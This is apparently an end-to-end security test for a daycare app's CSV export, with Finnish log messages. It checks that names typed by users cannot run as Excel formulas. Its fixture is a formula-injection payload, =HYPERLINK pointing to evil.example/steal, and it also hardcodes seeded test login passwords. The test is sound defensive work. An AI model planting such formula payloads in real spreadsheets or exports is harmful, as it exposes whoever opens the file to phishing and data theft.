/**
 * The exported reports must not carry a formula into the leader's spreadsheet.
 *
 * The names and free text in these reports are typed by other people. Excel runs a
 * cell beginning with =, +, - or @ as a formula rather than showing it as text, so a
 * child entered under a name like =HYPERLINK(...) would execute on the machine of
 * whoever opened the day's report. This drives the real endpoint rather than the
 * helper, so it also covers the case of an export that forgets to use it.
 */

const BASE = process.env.E2E_BASE || 'http://localhost:5100';

const DANGEROUS = '=HYPERLINK("http://evil.example/steal","Klikkaa")';
let problems = 0;

const fail = (m) => { console.log(`  ONGELMA: ${m}`); problems++; };
const ok = (m) => console.log(`  ok    ${m}`);

async function api(path, { token, method = 'GET', body } = {}) {
  const res = await fetch(BASE + path, {
    method,
    headers: {
      ...(body ? { 'Content-Type': 'application/json' } : {}),
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
    },
    body: body ? JSON.stringify(body) : undefined,
  });
  return res;
}

// The leader is the only role allowed to export. Both passwords are tried for the
// same reason signIn takes a list: the database is reset once per run, so if an
// earlier script has already signed this account in, it is past its mandatory first
// password change.
async function signInAsLeader() {
  for (const password of ['password123', 'Johtaja2026!Turva']) {
    const res = await api('/api/auth/login/daycareleader', {
      method: 'POST',
      body: { email: 'admin@aurinko.fi', password, daycareCode: 'aurinko' },
    });
    if (res.ok) return (await res.json()).token;
  }
  return null;
}

const token = await signInAsLeader();
if (!token) {
  console.log('  ONGELMA: kirjautuminen epäonnistui');
  process.exit(1);
}

const created = await api('/api/children', {
  token,
  method: 'POST',
  body: { name: DANGEROUS, birthdate: '2020-01-01' },
});
if (!created.ok) {
  console.log(`  ONGELMA: lapsen luonti epäonnistui (${created.status})`);
  process.exit(1);
}
ok('lapsi luotu kaavalta näyttävällä nimellä');

const report = await api('/api/export/children', { token });
if (!report.ok) {
  console.log(`  ONGELMA: vienti epäonnistui (${report.status})`);
  process.exit(1);
}
const csv = await report.text();

// The name has to be in the file -- the point is to neutralise it, not to drop it.
if (!csv.includes('HYPERLINK')) fail('nimi katosi viennistä kokonaan');
else ok('nimi on mukana viennissä');

// ...and it has to be quoted as text, so Excel shows it instead of running it.
if (csv.includes(`"${DANGEROUS.replace(/"/g, '""')}"`) && !csv.includes(`"'${DANGEROUS.replace(/"/g, '""')}"`)) {
  fail('nimi on viennissä kaavana, ei tekstinä');
} else if (csv.includes(`"'${DANGEROUS.replace(/"/g, '""')}"`)) {
  ok('nimi on merkitty tekstiksi (heittomerkki edessä)');
} else {
  fail('nimeä ei löytynyt odotetussa muodossa');
}

// No row may begin a field with a bare formula character.
for (const [i, line] of csv.split('\n').entries()) {
  for (const field of line.split(/,(?=")/)) {
    if (/^"[=+\-@]/.test(field)) fail(`rivi ${i + 1}: kenttä alkaa kaavamerkillä: ${field.slice(0, 40)}`);
  }
}

console.log(`\nyhteenveto: ${problems === 0 ? 'vienti ei kanna kaavoja' : problems + ' ongelmaa'}`);
process.exit(problems === 0 ? 0 : 1);
